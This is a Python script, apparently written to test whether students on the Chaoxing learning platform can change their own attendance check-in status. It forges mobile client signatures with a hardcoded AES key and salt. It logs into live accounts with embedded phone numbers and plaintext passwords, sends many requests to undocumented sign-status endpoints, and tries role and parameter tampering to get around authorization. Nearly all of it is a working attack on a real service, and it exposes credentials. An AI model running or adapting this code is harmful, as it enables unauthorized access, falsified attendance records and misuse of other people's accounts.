import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
TEACHER_PUID = "402644510"
STUDENT_PUID = "431407443"
TEST_AID = "5000163767353"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:800]})
    vuln = any(kw in detail.lower() for kw in ["success", "修改成功"]) or '"state":"success"' in evidence
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:200]}")

def run():
    print("=" * 80)
    print(f"学生端直接修改签到状态漏洞验证")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"

    print("\n" + "=" * 80)
    print("[2] Task 1: 探索V3/V4/V5等更高版本API")
    print("=" * 80)

    api_endpoints = [
        "/pptSign/updateSignStatusByUidsV3",
        "/pptSign/updateSignStatusByUidsV4",
        "/pptSign/updateSignStatusByUidsV5",
        "/pptSign/updateSignStatusV3",
        "/pptSign/updateSignStatusV4",
        "/pptSign/updateSignStatusByUids",
        "/pptSign/batchUpdateSignStatus",
        "/pptSign/modifySignStatus",
        "/pptSign/changeSignStatus",
        "/pptSign/setSignStatus",
        "/pptSign/updateSignResult",
        "/pptSign/saveSignResult",
        "/v2/apis/sign/updateSignStatusByUids",
        "/v2/apis/sign/updateSignStatus",
        "/v2/apis/sign/modifySignStatus",
        "/v2/apis/sign/batchUpdateSignStatus",
        "/v3/apis/sign/updateSignStatusByUids",
        "/v3/apis/sign/updateSignStatus",
    ]

    for endpoint in api_endpoints:
        url = f"{base}{endpoint}"
        for session, label, puid in [(s_t, "教师", puid_t), (s_s, "学生", puid_s)]:
            try:
                r = session.post(url,
                    params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                    data={"uids": STUDENT_PUID, "status": "2", "remark": ""},
                    headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                             "Content-Type": "application/x-www-form-urlencoded"},
                    timeout=15, allow_redirects=False)
                is_json = "application/json" in r.headers.get("Content-Type", "")
                is_not_404 = r.status_code != 404
                if is_not_404 or is_json:
                    rec(f"T1-{endpoint.split('/')[-1][:25]}-{label}",
                        f"{label} {endpoint}: HTTP {r.status_code}, {r.text[:100]}",
                        r.text[:300])
                else:
                    print(f"  [404] {label} {endpoint}")
            except Exception as e:
                print(f"  [ERR] {label} {endpoint}: {e}")

            try:
                r = session.get(url,
                    params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId",
                            "activeId": TEST_AID, "uids": STUDENT_PUID, "status": "2", "remark": ""},
                    headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest"},
                    timeout=15, allow_redirects=False)
                is_not_404 = r.status_code != 404
                if is_not_404:
                    rec(f"T1-GET-{endpoint.split('/')[-1][:20]}-{label}",
                        f"{label} GET {endpoint}: HTTP {r.status_code}, {r.text[:100]}",
                        r.text[:300])
            except:
                pass

    print("\n" + "=" * 80)
    print("[3] Task 2: 学生端浏览器控制台场景模拟")
    print("=" * 80)

    print("\n--- 学生先访问mobilelearn获取完整Cookie ---")
    s_s_web = requests.Session()
    s_s_web.verify = False
    web_ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0")
    s_s_web.headers.update({"User-Agent": web_ua})

    s_s_web.post("https://passport2.chaoxing.com/fanyalogin",
                 data={"fid": "-1", "uname": "18436633997", "password": "3.1415926Cpy",
                       "refer": "http://i.chaoxing.com", "t": "true",
                       "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0"},
                 headers={"X-Requested-With": "XMLHttpRequest"},
                 allow_redirects=False, timeout=30)

    try:
        s_s_web.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass

    try:
        s_s_web.get(f"{base}/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={puid_s}",
                    timeout=20)
    except:
        pass

    try:
        s_s_web.get(f"{base}/newsign/preSign?activeId={TEST_AID}&classId={CLASS_ID}&courseId={COURSE_ID}&uid={puid_s}",
                    timeout=20)
    except:
        pass

    cookie_names = [c.name for c in s_s_web.cookies]
    print(f"  学生Web Cookie: {cookie_names}")

    print("\n--- 模拟浏览器控制台fetch请求 ---")
    browser_headers = {
        "accept": "*/*",
        "accept-language": "zh-CN,zh;q=0.9",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "sec-ch-ua": '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-requested-with": "XMLHttpRequest",
        "Referer": f"{base}/pptSign/signedResult?activeId={TEST_AID}&classId={CLASS_ID}&courseId={COURSE_ID}&uid={puid_s}",
    }

    r = s_s_web.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                     data={"uids": STUDENT_PUID, "status": "2", "remark": ""},
                     headers={**browser_headers, "Content-Type": "application/x-www-form-urlencoded"},
                     timeout=20)
    rec("T2-01", f"学生Web+浏览器头+urlencoded: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    boundary = "----WebKitFormBoundary2BMSjhKUdDzjtnFw"
    body = (f"------WebKitFormBoundary2BMSjhKUdDzjtnFw\r\n"
            f"Content-Disposition: form-data; name=\"uids\"\r\n\r\n{STUDENT_PUID}\r\n"
            f"------WebKitFormBoundary2BMSjhKUdDzjtnFw\r\n"
            f"Content-Disposition: form-data; name=\"status\"\r\n\r\n2\r\n"
            f"------WebKitFormBoundary2BMSjhKUdDzjtnFw\r\n"
            f"Content-Disposition: form-data; name=\"remark\"\r\n\r\n\r\n"
            f"------WebKitFormBoundary2BMSjhKUdDzjtnFw--\r\n")
    r = s_s_web.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                     data=body.encode(),
                     headers={**browser_headers, "Content-Type": f"multipart/form-data; boundary=----WebKitFormBoundary2BMSjhKUdDzjtnFw"},
                     timeout=20)
    rec("T2-02", f"学生Web+浏览器头+multipart: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    r = s_s_web.get(f"{base}/pptSign/updateSignStatusByUidsV2",
                    params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId",
                            "activeId": TEST_AID, "uids": STUDENT_PUID, "status": "2", "remark": ""},
                    headers=browser_headers,
                    timeout=20)
    rec("T2-03", f"学生Web+浏览器头+GET: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n--- 不带X-Requested-With头测试 ---")
    r = s_s_web.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                     data={"uids": STUDENT_PUID, "status": "2", "remark": ""},
                     headers={"Referer": f"{base}/", "Content-Type": "application/x-www-form-urlencoded"},
                     timeout=20)
    rec("T2-04", f"学生Web+无XHR头: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[4] Task 3: updateSignStatusByUidsV2学生端深度绕过测试")
    print("=" * 80)

    bypass_tests = [
        ({"uids": STUDENT_PUID, "status": "2", "remark": "", "courseId": COURSE_ID, "classId": CLASS_ID},
         "学生+courseId/classId"),
        ({"uids": STUDENT_PUID, "status": "2", "remark": "", "uid": puid_t},
         "学生+uid=教师puid"),
        ({"uids": STUDENT_PUID, "status": "2", "remark": "", "cpi": "520211407"},
         "学生+cpi"),
        ({"uids": STUDENT_PUID, "status": "2", "remark": "", "roletype": "1"},
         "学生+roletype=1"),
        ({"uids": STUDENT_PUID, "status": "2", "remark": "", "role": "1"},
         "学生+role=1"),
        ({"uids": STUDENT_PUID, "status": "2", "remark": "", "operateSource": "2"},
         "学生+operateSource=2"),
        ({"uids": STUDENT_PUID, "status": "2", "remark": "", "sourceType": "1"},
         "学生+sourceType=1"),
        ({"uids": STUDENT_PUID, "status": "2", "remark": "", "type": "1"},
         "学生+type=1"),
        ({"uids": STUDENT_PUID, "status": "2", "remark": "", "activeType": "2"},
         "学生+activeType=2"),
        ({"uids": f"[{STUDENT_PUID}]", "status": "2", "remark": ""},
         "学生+uids=JSON数组"),
        ({"uids": STUDENT_PUID, "status": "2", "remark": "", "signType": "1"},
         "学生+signType=1"),
    ]

    for i, (data, desc) in enumerate(bypass_tests):
        r = s_s_web.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                         data=data,
                         headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                  "Content-Type": "application/x-www-form-urlencoded"},
                         timeout=20)
        rec(f"T4-{i:02d}", f"{desc}: {r.text[:100]}", r.text[:300])

    print("\n--- 不同DB_STRATEGY测试 ---")
    for db_str in ["PRIMARY_KEY", "NONE", "", "SLAVE", "RANDOM", "COURSEID"]:
        r = s_s_web.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                         params={"DB_STRATEGY": db_str, "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                         data={"uids": STUDENT_PUID, "status": "2", "remark": ""},
                         headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                  "Content-Type": "application/x-www-form-urlencoded"},
                         timeout=20)
        rec(f"T4-db-{db_str or 'empty'}", f"学生 DB_STRATEGY={db_str or 'empty'}: {r.text[:100]}", r.text[:300])

    print("\n--- 学生使用不同Content-Type ---")
    for ct in ["application/json", "text/plain", "application/x-www-form-urlencoded", "multipart/form-data"]:
        if ct == "multipart/form-data":
            r = s_s_web.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                             files={"uids": (None, STUDENT_PUID), "status": (None, "2"), "remark": (None, "")},
                             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest"},
                             timeout=20)
        elif ct == "application/json":
            r = s_s_web.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                             data=json.dumps({"uids": STUDENT_PUID, "status": "2", "remark": ""}),
                             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest", "Content-Type": ct},
                             timeout=20)
        else:
            r = s_s_web.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                             data={"uids": STUDENT_PUID, "status": "2", "remark": ""},
                             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest", "Content-Type": ct},
                             timeout=20)
        rec(f"T4-ct-{ct.split('/')[-1][:10]}", f"学生 Content-Type={ct}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[5] Task 4: 签到管理页面JS源码分析")
    print("=" * 80)

    r = s_t.get(f"{base}/pptSign/signedResult",
                params={"activeId": TEST_AID, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t},
                headers={"Referer": f"{base}/"}, timeout=20)
    if r.status_code == 200 and len(r.text) > 100:
        js_files = re.findall(r'src=["\']([^"\']*\.js)["\']', r.text)
        rec("T5-01", f"signedResult页面JS文件: {js_files[:10]}", r.text[:500])

        all_apis = set()
        all_apis.update(re.findall(r'["\']([^"\']*(?:updateSign|modifySign|changeSign|signStatus|pptSign)[^"\']*)["\']', r.text, re.I))
        all_apis.update(re.findall(r'url:\s*["\']([^"\']+)["\']', r.text))
        all_apis.update(re.findall(r'\.post\(["\']([^"\']+)["\']', r.text))
        all_apis.update(re.findall(r'\.get\(["\']([^"\']+)["\']', r.text))
        all_apis.update(re.findall(r'fetch\(["\']([^"\']+)["\']', r.text))
        if all_apis:
            rec("T5-02", f"signedResult页面API: {all_apis}", str(all_apis)[:500])

        for js_url in js_files[:5]:
            if not js_url.startswith("http"):
                js_url = f"{base}{js_url}" if js_url.startswith("/") else f"{base}/{js_url}"
            try:
                r_js = s_t.get(js_url, timeout=15)
                if r_js.status_code == 200 and len(r_js.text) > 100:
                    js_apis = set(re.findall(r'["\']([^"\']*(?:updateSign|modifySign|changeSign|signStatus|pptSign|activeAPI)[^"\']*)["\']', r_js.text, re.I))
                    js_ajax = set(re.findall(r'url:\s*["\']([^"\']+)["\']', r_js.text))
                    js_post = set(re.findall(r'\.post\(["\']([^"\']+)["\']', r_js.text))
                    js_fetch = set(re.findall(r'fetch\(["\']([^"\']+)["\']', r_js.text))
                    all_js = js_apis | js_ajax | js_post | js_fetch
                    if all_js:
                        rec(f"T5-JS-{js_url.split('/')[-1][:15]}", f"JS API: {all_js}", str(all_js)[:500])

                    sign_related = re.findall(r'updateSignStatus\w*', r_js.text)
                    if sign_related:
                        rec(f"T5-SIGN-{js_url.split('/')[-1][:15]}", f"签到状态修改API: {set(sign_related)}")

                    permission_checks = re.findall(r'(role|roletype|permission|auth|isAdmin|isTeacher)\w*', r_js.text, re.I)
                    if permission_checks:
                        rec(f"T5-PERM-{js_url.split('/')[-1][:15]}", f"权限校验关键词: {set(permission_checks[:20])}")
            except:
                pass
    else:
        rec("T5-01", f"signedResult页面: HTTP {r.status_code}, len={len(r.text)}")

    print("\n" + "=" * 80)
    print("[6] 保存结果")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "student_direct_modify_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    success = sum(1 for r in results if '"state":"success"' in r.get("evidence", ""))
    perm = sum(1 for r in results if "无权限" in r.get("detail", "") or "无权限" in r.get("evidence", ""))
    print(f"  成功: {success}, 无权限: {perm}")

if __name__ == "__main__":
    run()
